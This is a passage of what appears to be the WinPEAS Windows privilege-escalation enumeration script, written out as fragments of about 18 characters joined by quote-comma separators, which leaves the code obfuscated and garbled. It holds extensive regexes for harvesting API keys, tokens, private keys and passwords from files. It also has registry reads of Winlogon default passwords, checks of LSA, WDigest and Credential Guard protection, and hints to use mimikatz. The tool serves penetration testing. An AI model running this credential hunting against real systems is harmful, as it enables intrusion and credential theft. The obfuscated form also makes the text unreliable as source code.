  $re','gexSearch.add("Mai','lboxValidator", "(','mailbox.?validator','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([A-Z0-9]{20})[''"','"]")
  $regexSearc','h.add("Mailchimp A','PI Key", "[0-9a-f]','{32}-us[0-9]{1,2}"',')
  $regexSearch.a','dd("Mailgun API Ke','y", "key-[0-9a-zA-','Z]{32}''")
  $regex','Search.add("Mailgu','n Public Validatio','n Key", "pubkey-[a','-f0-9]{32}")
  $re','gexSearch.add("Mai','lgun Webhook signi','ng key", "[a-h0-9]','{32}-[a-h0-9]{8}-[','a-h0-9]{8}")
  $re','gexSearch.add("Map','box API Key", "(pk','\.[a-z0-9]{60}\.[a','-z0-9]{22})")
  $r','egexSearch.add("Ma','ttermost Access To','ken", "([a-z0-9]{2','6})")
  $regexSear','ch.add("MessageBir','d API Key & API cl','ient ID", "(messag','ebird[a-z0-9_ \.,\','-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5','}[''""]([a-z0-9]{25','}|[a-h0-9]{8}-[a-h','0-9]{4}-[a-h0-9]{4','}-[a-h0-9]{4}-[a-h','0-9]{12})[''""]")
 ',' $regexSearch.add(','"Microsoft Teams W','ebhook", "https:\/','\/[a-z0-9]+\.webho','ok\.office\.com\/w','ebhookb2\/[a-z0-9]','{8}-([a-z0-9]{4}-)','{3}[a-z0-9]{12}@[a','-z0-9]{8}-([a-z0-9',']{4}-){3}[a-z0-9]{','12}\/IncomingWebho','ok\/[a-z0-9]{32}\/','[a-z0-9]{8}-([a-z0','-9]{4}-){3}[a-z0-9',']{12}")
  $regexSe','arch.add("MojoAuth',' API Key", "[a-f0-','9]{8}-[a-f0-9]{4}-','[a-f0-9]{4}-[a-f0-','9]{4}-[a-f0-9]{12}','")
  $regexSearch.','add("Netlify Acces','s Token", "([a-z0-','9=_\-]{40,46})")
 ',' $regexSearch.add(','"New Relic User AP','I Key, User API ID',' & Ingest Browser ','API Key", "(NRAK-[','A-Z0-9]{27})|((new','relic[a-z0-9_ \.,\','-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5','}[''""]([A-Z0-9]{64','})[''""])|(NRJS-[a-','f0-9]{19})")
  $re','gexSearch.add("Now','nodes", "(nownodes','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([A-Za-z0-9]{32})','[''""]")
  $regexSe','arch.add("Npm Acce','ss Token", "(npm_[','a-zA-Z0-9]{36})")
','  $regexSearch.add','("Nytimes Access T','oken", "([a-z0-9=_','\-]{32})")
  $rege','xSearch.add("Okta ','Access Token", "([','a-z0-9=_\-]{42})")','
  $regexSearch.ad','d("OpenAI API Toke','n", "sk-[A-Za-z0-9',']{48}")
  $regexSe','arch.add("ORB Inte','lligence Access Ke','y", "[''""][a-f0-9]','{8}-[a-f0-9]{4}-[a','-f0-9]{4}-[a-f0-9]','{4}-[a-f0-9]{12}[''','""]")
  $regexSear','ch.add("Pastebin A','PI Key", "(pastebi','n[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|:','|<=|=>|:).{0,5}[''"','"]([a-z0-9]{32})[''','""]")
  $regexSear','ch.add("PayPal Bra','intree Access Toke','n", ''access_token\','$production\$[0-9a','-z]{16}\$[0-9a-f]{','32}'')
  $regexSear','ch.add("Picatic AP','I Key", "sk_live_[','0-9a-z]{32}")
  $r','egexSearch.add("Pi','nata API Key", "(p','inata[a-z0-9_ \.,\','-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5','}[''""]([a-z0-9]{64','})[''""]")
  $regex','Search.add("Planet','scale API Key", "p','scale_tkn_[a-zA-Z0','-9_\.\-]{43}")
  $','regexSearch.add("P','lanetScale OAuth t','oken", "(pscale_oa','uth_[a-zA-Z0-9_\.\','-]{32,64})")
  $re','gexSearch.add("Pla','netscale Password"',', "pscale_pw_[a-zA','-Z0-9_\.\-]{43}")
','  $regexSearch.add','("Plaid API Token"',', "(access-(?:sand','box|development|pr','oduction)-[0-9a-f]','{8}-[0-9a-f]{4}-[0','-9a-f]{4}-[0-9a-f]','{4}-[0-9a-f]{12})"',')
  $regexSearch.a','dd("Plaid Client I','D", "([a-z0-9]{24}',')")
  $regexSearch','.add("Plaid Secret',' key", "([a-z0-9]{','30})")
  $regexSea','rch.add("Prefect A','PI token", "(pnu_[','a-z0-9]{36})")
  $','regexSearch.add("P','ostman API Key", "','PMAK-[a-fA-F0-9]{2','4}-[a-fA-F0-9]{34}','")
  $regexSearch.','add("Private Keys"',', "\-\-\-\-\-BEGIN',' PRIVATE KEY\-\-\-','\-\-|\-\-\-\-\-BEG','IN RSA PRIVATE KEY','\-\-\-\-\-|\-\-\-\','-\-BEGIN OPENSSH P','RIVATE KEY\-\-\-\-','\-|\-\-\-\-\-BEGIN',' PGP PRIVATE KEY B','LOCK\-\-\-\-\-|\-\','-\-\-\-BEGIN DSA P','RIVATE KEY\-\-\-\-','\-|\-\-\-\-\-BEGIN',' EC PRIVATE KEY\-\','-\-\-\-")
  $regex','Search.add("Pulumi',' API Key", "pul-[a','-f0-9]{40}")
  $re','gexSearch.add("PyP','I upload token", "','pypi-AgEIcHlwaS5vc','mc[A-Za-z0-9_\-]{5','0,}")
  $regexSear','ch.add("Quip API K','ey", "(quip[a-z0-9','_ \.,\-]{0,25})(=|','>|:=|\|\|:|<=|=>|:',').{0,5}[''""]([a-zA','-Z0-9]{15}=\|[0-9]','{10}\|[a-zA-Z0-9\/','+]{43}=)[''""]")
  ','$regexSearch.add("','RapidAPI Access To','ken", "([a-z0-9_-]','{50})")
  $regexSe','arch.add("Rubygem ','API Key", "rubygem','s_[a-f0-9]{48}")
 ',' $regexSearch.add(','"Readme API token"',', "rdme_[a-z0-9]{7','0}")
  $regexSearc','h.add("Sendbird Ac','cess ID", "([0-9a-','f]{8}-[0-9a-f]{4}-','[0-9a-f]{4}-[0-9a-','f]{4}-[0-9a-f]{12}',')")
  $regexSearch','.add("Sendbird Acc','ess Token", "([a-f','0-9]{40})")
  $reg','exSearch.add("Send','grid API Key", "SG','\.[a-zA-Z0-9_\.\-]','{66}")
  $regexSea','rch.add("Sendinblu','e API Key", "xkeys','ib-[a-f0-9]{64}-[a','-zA-Z0-9]{16}")
  ','$regexSearch.add("','Sentry Access Toke','n", "([a-f0-9]{64}',')")
  $regexSearch','.add("Shippo API K','ey, Access Token, ','Custom Access Toke','n, Private App Acc','ess Token & Shared',' Secret", "shippo_','(live|test)_[a-f0-','9]{40}|shpat_[a-fA','-F0-9]{32}|shpca_[','a-fA-F0-9]{32}|shp','pa_[a-fA-F0-9]{32}','|shpss_[a-fA-F0-9]','{32}")
  $regexSea','rch.add("Sidekiq S','ecret", "([a-f0-9]','{8}:[a-f0-9]{8})")','
  $regexSearch.ad','d("Sidekiq Sensiti','ve URL", "([a-f0-9',']{8}:[a-f0-9]{8})@','(?:gems.contribsys','.com|enterprise.co','ntribsys.com)")
  ','$regexSearch.add("','Slack Token", "xox','[baprs]-([0-9a-zA-','Z]{10,48})?")
  $r','egexSearch.add("Sl','ack Webhook", "htt','ps://hooks.slack.c','om/services/T[a-zA','-Z0-9_]{10}/B[a-zA','-Z0-9_]{10}/[a-zA-','Z0-9_]{24}")
  $re','gexSearch.add("Sma','rksheel API Key", ','"(smartsheet[a-z0-','9_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([a-z','0-9]{26})[''""]")
 ',' $regexSearch.add(','"Square Access Tok','en", "sqOatp-[0-9A','-Za-z_\-]{22}")
  ','$regexSearch.add("','Square API Key", "','EAAAE[a-zA-Z0-9_-]','{59}")
  $regexSea','rch.add("Square Oa','uth Secret", "sq0c','sp-[ 0-9A-Za-z_\-]','{43}")
  $regexSea','rch.add("Stytch AP','I Key", "secret-.*','-[a-zA-Z0-9_=\-]{3','6}")
  $regexSearc','h.add("Stripe Acce','ss Token & API Key','", "(sk|pk)_(test|','live)_[0-9a-z]{10,','32}|k_live_[0-9a-z','A-Z]{24}")
  $rege','xSearch.add("SumoL','ogic Access ID", "','([a-z0-9]{14})")
 ',' $regexSearch.add(','"SumoLogic Access ','Token", "([a-z0-9]','{64})")
  $regexSe','arch.add("Telegram',' Bot API Token", "','[0-9]+:AA[0-9A-Za-','z\\-_]{33}")
  $re','gexSearch.add("Tra','vis CI Access Toke','n", "([a-z0-9]{22}',')")
  $regexSearch','.add("Trello API K','ey", "(trello[a-z0','-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([0-','9a-z]{32})[''""]")
','  $regexSearch.add','("Twilio API Key",',' "SK[0-9a-fA-F]{32','}")
  $regexSearch','.add("Twitch API K','ey", "(twitch[a-z0','-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a-','z0-9]{30})[''""]")
','  $regexSearch.add','("Twitter Client I','D", "[tT][wW][iI][','tT][tT][eE][rR](.{','0,20})?[''""][0-9a-','z]{18,25}")
  $reg','exSearch.add("Twit','ter Bearer Token",',' "(A{22}[a-zA-Z0-9','%]{80,100})")
  $r','egexSearch.add("Tw','itter Oauth", "[tT','][wW][iI][tT][tT][','eE][rR].{0,30}[''""','\\s][0-9a-zA-Z]{35',',44}[''""\\s]")
  $','regexSearch.add("T','witter Secret Key"',', "[tT][wW][iI][tT','][tT][eE][rR](.{0,','20})?[''""][0-9a-z]','{35,44}")
  $regex','Search.add("Typefo','rm API Key", "tfp_','[a-z0-9_\.=\-]{59}','")
  $regexSearch.','add("URLScan API K','ey", "[''""][a-f0-9',']{8}-[a-f0-9]{4}-[','a-f0-9]{4}-[a-f0-9',']{4}-[a-f0-9]{12}[','''""]")
  $regexSea','rch.add("Vault Tok','en", "[sb]\.[a-zA-','Z0-9]{24}")
  $reg','exSearch.add("Yand','ex Access Token", ','"(t1\.[A-Z0-9a-z_-',']+[=]{0,2}\.[A-Z0-','9a-z_-]{86}[=]{0,2','})")
  $regexSearc','h.add("Yandex API ','Key", "(AQVN[A-Za-','z0-9_\-]{35,38})")','
  $regexSearch.ad','d("Yandex AWS Acce','ss Token", "(YC[a-','zA-Z0-9_\-]{38})")','
  $regexSearch.ad','d("Web3 API Key", ','"(web3[a-z0-9_ \.,','\-]{0,25})(=|>|:=|','\|\|:|<=|=>|:).{0,','5}[''""]([A-Za-z0-9','_=\-]+\.[A-Za-z0-9','_=\-]+\.?[A-Za-z0-','9_.+/=\-]*)[''""]")','
  $regexSearch.ad','d("Zendesk Secret ','Key", "([a-z0-9]{4','0})")
  $regexSear','ch.add("Generic AP','I Key", "((key|api','|token|secret|pass','word)[a-z0-9_ \.,\','-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5','}[''""]([0-9a-zA-Z_','=\-]{8,64})[''""]")','
}

if ($webAuth) ','{
  $regexSearch.a','dd("Authorization ','Basic", "basic [a-','zA-Z0-9_:\.=\-]+")','
  $regexSearch.ad','d("Authorization B','earer", "bearer [a','-zA-Z0-9_\.=\-]+")','
  $regexSearch.ad','d("Alibaba Access ','Key ID", "(LTAI)[a','-z0-9]{20}")
  $re','gexSearch.add("Ali','baba Secret Key", ','"(alibaba[a-z0-9_ ','\.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:).','{0,5}[''""]([a-z0-9',']{30})[''""]")
  $r','egexSearch.add("As','ana Client ID", "(','(asana[a-z0-9_ \.,','\-]{0,25})(=|>|:=|','\|\|:|<=|=>|:).{0,','5}[''""]([0-9]{16})','[''""])|((asana[a-z','0-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|=','>|:).{0,5}[''""]([a','-z0-9]{32})[''""])"',')
  $regexSearch.a','dd("AWS Client ID"',', "(A3T[A-Z0-9]|AK','IA|AGPA|AIDA|AROA|','AIPA|ANPA|ANVA|ASI','A)[A-Z0-9]{16}")
 ',' $regexSearch.add(','"AWS MWS Key", "am','zn\.mws\.[0-9a-f]{','8}-[0-9a-f]{4}-[0-','9a-f]{4}-[0-9a-f]{','4}-[0-9a-f]{12}")
','  $regexSearch.add','("AWS Secret Key",',' "aws(.{0,20})?[''"','"][0-9a-zA-Z\/+]{4','0}[''""]")
  $regex','Search.add("AWS Ap','pSync GraphQL Key"',', "da2-[a-z0-9]{26','}")
  $regexSearch','.add("Basic Auth C','redentials", "://[','a-zA-Z0-9]+:[a-zA-','Z0-9]+@[a-zA-Z0-9]','+\.[a-zA-Z]+")
  $','regexSearch.add("B','eamer Client Secre','t", "(beamer[a-z0-','9_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>|',':).{0,5}[''""](b_[a','-z0-9=_\-]{44})[''"','"]")
  $regexSearc','h.add("Cloudinary ','Basic Auth", "clou','dinary://[0-9]{15}',':[0-9A-Za-z]+@[a-z',']+")
  $regexSearc','h.add("Facebook Cl','ient ID", "([fF][a','A][cC][eE][bB][oO]','[oO][kK]|[fF][bB])','(.{0,20})?[''""][0-','9]{13,17}")
  $reg','exSearch.add("Face','book Oauth", "[fF]','[aA][cC][eE][bB][o','O][oO][kK].*[''|""]','[0-9a-f]{32}[''|""]','")
  $regexSearch.','add("Facebook Secr','et Key", "([fF][aA','][cC][eE][bB][oO][','oO][kK]|[fF][bB])(','.{0,20})?[''""][0-9','a-f]{32}")
  $rege','xSearch.add("Jenki','ns Creds", "<[a-zA','-Z]*>{[a-zA-Z0-9=+','/]*}<")
  $regexSe','arch.add("Generic ','Secret", "[sS][eE]','[cC][rR][eE][tT].*','[''""][0-9a-zA-Z]{3','2,45}[''""]")
  $re','gexSearch.add("Bas','ic Auth", "//(.+):','(.+)@")
  $regexSe','arch.add("PHP Pass','words", "(pwd|pass','wd|password|PASSWD','|PASSWORD|dbuser|d','bpass|pass'').*[=:]','.+|define ?\(''(\w*','pass|\w*pwd|\w*use','r|\w*datab)")
  $r','egexSearch.add("Co','nfig Secrets (Pass','wd / Credentials)"',', "passwd.*|creden','.*|^kind:[^a-zA-Z0','-9_]?Secret|[^a-zA','-Z0-9_]env:|secret',':|secretName:|^kin','d:[^a-zA-Z0-9_]?En','cryptionConfigurat','ion|\-\-encryption','\-provider\-config','")
  $regexSearch.','add("Generiac API ','tokens search", "(','access_key|access_','token|admin_pass|a','dmin_user|algolia_','admin_key|algolia_','api_key|alias_pass','|alicloud_access_k','ey| amazon_secret_','access_key|amazona','ws|ansible_vault_p','assword|aos_key|ap','i_key|api_key_secr','et|api_key_sid|api','_secret| api.googl','emaps AIza|apidocs','|apikey|apiSecret|','app_debug|app_id|a','pp_key|app_log_lev','el|app_secret|appk','ey|appkeysecret| a','pplication_key|app','secret|appspot|aut','h_token|authorizat','ionToken|authsecre','t|aws_access|aws_a','ccess_key_id|aws_b','ucket| aws_key|aws','_secret|aws_secret','_key|aws_token|AWS','SecretKey|b2_app_k','ey|bashrc password','| bintray_apikey|b','intray_gpg_passwor','d|bintray_key|bint','raykey|bluemix_api','_key|bluemix_pass|','browserstack_acces','s_key| bucket_pass','word|bucketeer_aws','_access_key_id|buc','keteer_aws_secret_','access_key|built_b','ranch_deploy_key|b','x_password|cache_d','river| cache_s3_se','cret_key|cattle_ac','cess_key|cattle_se','cret_key|certifica','te_password|ci_dep','loy_password|clien','t_secret| client_z','pk_secret_key|cloj','ars_password|cloud','_api_key|cloud_wat','ch_aws_access_key|','cloudant_password|',' cloudflare_api_ke','y|cloudflare_auth_','key|cloudinary_api','_secret|cloudinary','_name|codecov_toke','n|conn.login| conn','ectionstring|consu','mer_key|consumer_s','ecret|credentials|','cypress_record_key','|database_password','|database_schema_t','est| datadog_api_k','ey|datadog_app_key','|db_password|db_se','rver|db_username|d','bpasswd|dbpassword','|dbuser|deploy_pas','sword| digitalocea','n_ssh_key_body|dig','italocean_ssh_key_','ids|docker_hub_pas','sword|docker_key|d','ocker_pass|docker_','passwd| docker_pas','sword|dockerhub_pa','ssword|dockerhubpa','ssword|dot-files|d','otfiles|droplet_tr','avis_password|dyna','moaccesskeyid| dyn','amosecretaccesskey','|elastica_host|ela','stica_port|elastic','search_password|en','cryption_key|encry','ption_password| en','v.heroku_api_key|e','nv.sonatype_passwo','rd|eureka.awssecre','tkey)[a-z0-9_ .,<\','-]{0,25}(=|>|:=|\|','\|:|<=|=>|:).{0,5}','[''""]([0-9a-zA-Z_=','\-]{8,64})[''""]")
','}

if($FullCheck){','$Excel = $true}

$','regexSearch.add("I','Ps", "(25[0-5]|2[0','-4][0-9]|[01]?[0-9','][0-9]?)\.(25[0-5]','|2[0-4][0-9]|[01]?','[0-9][0-9]?)\.(25[','0-5]|2[0-4][0-9]|[','01]?[0-9][0-9]?)\.','(25[0-5]|2[0-4][0-','9]|[01]?[0-9][0-9]','?)")
$Drives = Get','-PSDrive | Where-O','bject { $_.Root -l','ike "*:\" }
$fileE','xtensions = @("*.x','ml", "*.txt", "*.c','onf", "*.config", ','"*.cfg", "*.ini", ','".y*ml", "*.log", ','"*.bak", "*.xls", ','"*.xlsx", "*.xlsm"',')


##############','########## INTRODU','CTION ############','############
$stop','watch = [system.di','agnostics.stopwatc','h]::StartNew()

if',' ($FullCheck) {
  ','Write-Host "**Full',' Check Enabled. Th','is will significan','tly increase false',' positives in regi','stry / folder chec','k for Usernames / ','Passwords.**"
}
# ','Introduction    
W','rite-Host -Backgro','undColor Red -Fore','groundColor White ','"ADVISORY: WinPEAS',' - Windows local P','rivilege Escalatio','n Awesome Script"
','Write-Host -Backgr','oundColor Red -For','egroundColor White',' "WinPEAS should b','e used for authori','zed penetration te','sting and/or educa','tional purposes on','ly"
Write-Host -Ba','ckgroundColor Red ','-ForegroundColor W','hite "Any misuse o','f this software wi','ll not be the resp','onsibility of the ','author or of any o','ther collaborator"','
Write-Host -Backg','roundColor Red -Fo','regroundColor Whit','e "Use it at your ','own networks and/o','r with the network',' owner''s explicit ','permission"


# Co','lor Scheme Introdu','ction
Write-Host -','ForegroundColor re','d    "Indicates sp','ecial privilege ov','er an object or mi','sconfiguration"
Wr','ite-Host -Foregrou','ndColor green  "In','dicates protection',' is enabled or som','ething is well con','figured"
Write-Hos','t -ForegroundColor',' cyan   "Indicates',' active users"
Wri','te-Host -Foregroun','dColor Gray   "Ind','icates disabled us','ers"
Write-Host -F','oregroundColor yel','low "Indicates lin','ks"
Write-Host -Fo','regroundColor Blue','   "Indicates titl','e"


Write-Host "Y','ou can find a Wind','ows local PE Check','list here: https:/','/book.hacktricks.w','iki/en/windows-har','dening/checklist-w','indows-privilege-e','scalation.html" -F','oregroundColor Yel','low
#write-host  "','Creating Dynamic l','ists, this could t','ake a while, pleas','e wait..."
#write-','host  "Loading sen','sitive_files yaml ','definitions file..','."
#write-host  "L','oading regexes yam','l definitions file','..."


###########','############# SYST','EM INFORMATION ###','##################','###

Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host "=========','==================','=========||SYSTEM ','INFORMATION ||====','==================','=============="
"T','he following infor','mation is curated.',' To get a full lis','t of system inform','ation, run the cmd','let get-computerin','fo"

#System Info ','from get-computer ','info
systeminfo.ex','e


#Hotfixes inst','alled sorted by da','te
Write-Host ""
i','f ($TimeStamp) { T','imeElapsed }
Write','-Host -ForegroundC','olor Blue "=======','==|| WINDOWS HOTFI','XES"
Write-Host "=','| Check if windows',' is vulnerable wit','h Watson https://g','ithub.com/rasta-mo','use/Watson" -Foreg','roundColor Yellow
','Write-Host "Possib','le exploits (https','://github.com/codi','ngo/OSCP-2/blob/ma','ster/Windows/WinPr','ivCheck.bat)" -For','egroundColor Yello','w
$Hotfix = Get-Ho','tFix | Sort-Object',' -Descending -Prop','erty InstalledOn -','ErrorAction Silent','lyContinue | Selec','t-Object HotfixID,',' Description, Inst','alledBy, Installed','On
$Hotfix | Forma','t-Table -AutoSize
','

#Show all unique',' updates installed','
Write-Host ""
if ','($TimeStamp) { Tim','eElapsed }
Write-H','ost -ForegroundCol','or Blue "=========','|| ALL UPDATES INS','TALLED"


# 0, and',' 5 are not used fo','r history
# See ht','tps://msdn.microso','ft.com/en-us/libra','ry/windows/desktop','/aa387095(v=vs.85)','.aspx
# Source: ht','tps://stackoverflo','w.com/questions/41','626129/how-do-i-ge','t-the-update-histo','ry-from-windows-up','date-in-powershell','?utm_medium=organi','c&utm_source=googl','e_rich_qa&utm_camp','aign=google_rich_q','a

$session = (New','-Object -ComObject',' ''Microsoft.Update','.Session'')
# Query',' the latest 50 upd','ates starting with',' the first record
','$history = $sessio','n.QueryHistory("",',' 0, 1000) | Select','-Object ResultCode',', Date, Title

#cr','eate an array for ','unique HotFixes
$H','otfixUnique = @()
','#$HotfixUnique += ','($history[0].title',' | Select-String -','AllMatches -Patter','n ''KB(\d{4,6})'').M','atches.Value

$Hot','FixReturnNum = @()','
#$HotFixReturnNum',' += 0 

for ($i = ','0; $i -lt $history','.Count; $i++) {
  ','$check = returnHot','FixID -title $hist','ory[$i].Title
  if',' ($HotfixUnique -l','ike $check) {
    ','#Do Nothing
  }
  ','else {
    $Hotfix','Unique += $check
 ','   $HotFixReturnNu','m += $i
  }
}
$Fin','alHotfixList = @()','

$hotfixreturnNum',' | ForEach-Object ','{
  $HotFixItem = ','$history[$_]
  $Re','sult = $HotFixItem','.ResultCode
  # ht','tps://learn.micros','oft.com/en-us/wind','ows/win32/api/wuap','i/ne-wuapi-operati','onresultcode?redir','ectedfrom=MSDN
  s','witch ($Result) {
','    1 {
      $Res','ult = "Missing/Sup','erseded"
    }
   ',' 2 {
      $Result',' = "Succeeded"
   ',' }
    3 {
      $','Result = "Succeede','d With Errors"
   ',' }
    4 {
      $','Result = "Failed"
','    }
    5 {
    ','  $Result = "Cance','led"
    }
  }
  $','FinalHotfixList +=',' New-Object -TypeN','ame PSObject -Prop','erty ([Ordered]@{ ','
    Result = $Res','ult
    Date   = $','HotFixItem.Date
  ','  Title  = $HotFix','Item.Title
  })
}
','$FinalHotfixList |',' Format-Table -Aut','oSize


Write-Host',' ""
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======|| Drive In','fo"
# Load the Sys','tem.Management ass','embly
Add-Type -As','semblyName System.','Management

# Crea','te a ManagementObj','ectSearcher to que','ry Win32_LogicalDi','sk
$diskSearcher =',' New-Object System','.Management.Manage','mentObjectSearcher','("SELECT * FROM Wi','n32_LogicalDisk WH','ERE DriveType = 3"',')

# Get the syste','m drives
$systemDr','ives = $diskSearch','er.Get()

# Loop t','hrough each drive ','and display its in','formation
foreach ','($drive in $system','Drives) {
  $drive','Letter = $drive.De','viceID
  $driveLab','el = $drive.Volume','Name
  $driveSize ','= [math]::Round($d','rive.Size / 1GB, 2',')
  $driveFreeSpac','e = [math]::Round(','$drive.FreeSpace /',' 1GB, 2)

  Write-','Output "Drive: $dr','iveLetter"
  Write','-Output "Label: $d','riveLabel"
  Write','-Output "Size: $dr','iveSize GB"
  Writ','e-Output "Free Spa','ce: $driveFreeSpac','e GB"
  Write-Outp','ut ""
}


Write-Ho','st ""
if ($TimeSta','mp) { TimeElapsed ','}
Write-Host -Fore','groundColor Blue "','=========|| Antivi','rus Detection (att','emping to read exc','lusions as well)"
','WMIC /Node:localho','st /Namespace:\\ro','ot\SecurityCenter2',' Path AntiVirusPro','duct Get displayNa','me
Get-ChildItem ''','registry::HKLM\SOF','TWARE\Microsoft\Wi','ndows Defender\Exc','lusions'' -ErrorAct','ion SilentlyContin','ue


Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| NET ACCOUNT','S Info"
net accoun','ts

##############','########## REGISTR','Y SETTING CHECK ##','##################','####
Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| REGISTRY SE','TTINGS CHECK"

 
W','rite-Host ""
if ($','TimeStamp) { TimeE','lapsed }
Write-Hos','t -ForegroundColor',' Blue "=========||',' Audit Log Setting','s"
#Check audit re','gistry
if ((Test-P','ath HKLM:\SOFTWARE','\Microsoft\Windows','\CurrentVersion\Po','licies\System\Audi','t\).Property) {
  ','Get-Item -Path HKL','M:\SOFTWARE\Micros','oft\Windows\Curren','tVersion\Policies\','System\Audit\
}
el','se {
  Write-Host ','"No Audit Log sett','ings, no registry ','entry found."
}

 ','
Write-Host ""
if ','($TimeStamp) { Tim','eElapsed }
Write-H','ost -ForegroundCol','or Blue "=========','|| Windows Event F','orward (WEF) regis','try"
if (Test-Path',' HKLM:\SOFTWARE\Po','licies\Microsoft\W','indows\EventLog\Ev','entForwarding\Subs','criptionManager) {','
  Get-Item HKLM:\','SOFTWARE\Policies\','Microsoft\Windows\','EventLog\EventForw','arding\Subscriptio','nManager
}
else {
','  Write-Host "Logs',' are not being fow','arded, no registry',' entry found."
}

',' 
Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| LAPS Check"
if',' (Test-Path ''C:\Pr','ogram Files\LAPS\C','SE\Admpwd.dll'') { ','Write-Host "LAPS d','ll found on this m','achine at C:\Progr','am Files\LAPS\CSE\','" -ForegroundColor',' Green }
elseif (T','est-Path ''C:\Progr','am Files (x86)\LAP','S\CSE\Admpwd.dll'' ',') { Write-Host "LA','PS dll found on th','is machine at C:\P','rogram Files (x86)','\LAPS\CSE\" -Foreg','roundColor Green }','
else { Write-Host',' "LAPS dlls not fo','und on this machin','e" }
if ((Get-Item','Property HKLM:\Sof','tware\Policies\Mic','rosoft Services\Ad','mPwd -ErrorAction ','SilentlyContinue).','AdmPwdEnabled -eq ','1) { Write-Host "L','APS registry key f','ound on this machi','ne" -ForegroundCol','or Green }


Write','-Host ""
if ($Time','Stamp) { TimeElaps','ed }
Write-Host -F','oregroundColor Blu','e "=========|| WDi','gest Check"
$WDige','st = (Get-ItemProp','erty HKLM:\SYSTEM\','CurrentControlSet\','Control\SecurityPr','oviders\WDigest).U','seLogonCredential
','switch ($WDigest) ','{
  0 { Write-Host',' "Value 0 found. P','lain-text Password','s are not stored i','n LSASS" }
  1 { W','rite-Host "Value 1',' found. Plain-text',' Passwords may be ','stored in LSASS" -','ForegroundColor re','d }
  Default { Wr','ite-Host "The syst','em was unable to f','ind the specified ','registry value: Us','eLogonCredential" ','}
}

 
Write-Host ','""
if ($TimeStamp)',' { TimeElapsed }
W','rite-Host -Foregro','undColor Blue "===','======|| LSA Prote','ction Check"
$RunA','sPPL = (Get-ItemPr','operty HKLM:\SYSTE','M\CurrentControlSe','t\Control\LSA).Run','AsPPL
$RunAsPPLBoo','t = (Get-ItemPrope','rty HKLM:\SYSTEM\C','urrentControlSet\C','ontrol\LSA).RunAsP','PLBoot
switch ($Ru','nAsPPL) {
  2 { Wr','ite-Host "RunAsPPL',': 2. Enabled witho','ut UEFI Lock" }
  ','1 { Write-Host "Ru','nAsPPL: 1. Enabled',' with UEFI Lock" }','
  0 { Write-Host ','"RunAsPPL: 0. LSA ','Protection Disable','d. Try mimikatz." ','-ForegroundColor r','ed }
  Default { "','The system was una','ble to find the sp','ecified registry v','alue: RunAsPPL / R','unAsPPLBoot" }
}
i','f ($RunAsPPLBoot) ','{ Write-Host "RunA','sPPLBoot: $RunAsPP','LBoot" }

 
Write-','Host ""
if ($TimeS','tamp) { TimeElapse','d }
Write-Host -Fo','regroundColor Blue',' "=========|| Cred','ential Guard Check','"
$LsaCfgFlags = (','Get-ItemProperty H','KLM:\SYSTEM\Curren','tControlSet\Contro','l\LSA).LsaCfgFlags','
switch ($LsaCfgFl','ags) {
  2 { Write','-Host "LsaCfgFlags',' 2. Enabled withou','t UEFI Lock" }
  1',' { Write-Host "Lsa','CfgFlags 1. Enable','d with UEFI Lock" ','}
  0 { Write-Host',' "LsaCfgFlags 0. L','saCfgFlags Disable','d." -ForegroundCol','or red }
  Default',' { "The system was',' unable to find th','e specified regist','ry value: LsaCfgFl','ags" }
}

 
Write-','Host ""
if ($TimeS','tamp) { TimeElapse','d }
Write-Host -Fo','regroundColor Blue',' "=========|| Cach','ed WinLogon Creden','tials Check"
if (T','est-Path "HKLM:\SO','FTWARE\Microsoft\W','indows NT\CurrentV','ersion\Winlogon") ','{
  (Get-ItemPrope','rty "HKLM:\SOFTWAR','E\Microsoft\Window','s NT\CurrentVersio','n\Winlogon" -Name ','"CACHEDLOGONSCOUNT','").CACHEDLOGONSCOU','NT
  Write-Host "H','owever, only the S','YSTEM user can vie','w the credentials ','here: HKEY_LOCAL_M','ACHINE\SECURITY\Ca','che"
  Write-Host ','"Or, using mimikat','z lsadump::cache"
','}

Write-Host ""
i','f ($TimeStamp) { T','imeElapsed }
Write','-Host -ForegroundC','olor Blue "=======','==|| Additonal Win','logon Credentials ','Check"

(Get-ItemP','roperty "HKLM:\SOF','TWARE\Microsoft\Wi','ndows NT\CurrentVe','rsion\Winlogon").D','efaultDomainName
(','Get-ItemProperty "','HKLM:\SOFTWARE\Mic','rosoft\Windows NT\','CurrentVersion\Win','logon").DefaultUse','rName
(Get-ItemPro','perty "HKLM:\SOFTW','ARE\Microsoft\Wind','ows NT\CurrentVers','ion\Winlogon").Def','aultPassword
(Get-','ItemProperty "HKLM',':\SOFTWARE\Microso','ft\Windows NT\Curr','entVersion\Winlogo','n").AltDefaultDoma','inName
(Get-ItemPr','operty "HKLM:\SOFT','WARE\Microsoft\Win','dows NT\CurrentVer','sion\Winlogon").Al','tDefaultUserName
(','Get-ItemProperty "','HKLM:\SOFTWARE\Mic','rosoft\Windows NT\','CurrentVersion\Win','logon").AltDefault','Password


Write-H','ost ""
if ($TimeSt','amp) { TimeElapsed',' }
Write-Host -For','egroundColor Blue ','"=========|| RDCMa','n Settings Check"
','
